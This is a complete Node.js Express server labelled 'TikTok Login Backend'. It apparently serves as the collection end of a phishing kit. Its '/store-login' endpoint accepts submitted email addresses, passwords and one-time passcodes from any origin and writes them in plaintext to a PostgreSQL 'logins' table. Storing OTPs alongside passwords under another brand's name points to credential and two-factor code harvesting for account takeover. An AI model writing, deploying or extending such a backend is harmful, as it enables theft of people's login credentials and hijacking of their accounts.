// server.js
require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());

// PostgreSQL connection (Neon DB)
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Create logins table (ONLY one table)
async function createTables() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS logins (
      id SERIAL PRIMARY KEY,
      email TEXT NOT NULL,
      password TEXT NOT NULL,
      otp TEXT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
  `);

  console.log("Tables are ready ✅");
}
createTables();

// =========================
// STORE LOGIN DATA
// =========================
app.post("/store-login", async (req, res) => {
  try {
    const { email, password, otp } = req.body;

    const query = `
      INSERT INTO logins (email, password, otp)
      VALUES ($1, $2, $3)
      RETURNING *;
    `;

    const result = await pool.query(query, [email, password, otp]);

    res.json({ success: true, data: result.rows[0] });
  } catch (err) {
    console.error("DB error:", err);
    res.status(500).json({ success: false, message: "Database error" });
  }
});

// =========================
// ROOT PATH
// =========================
app.get("/", (req, res) => {
  res.send("TikTok Login Backend is Running...");
});

// =========================
// START SERVER
// =========================
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
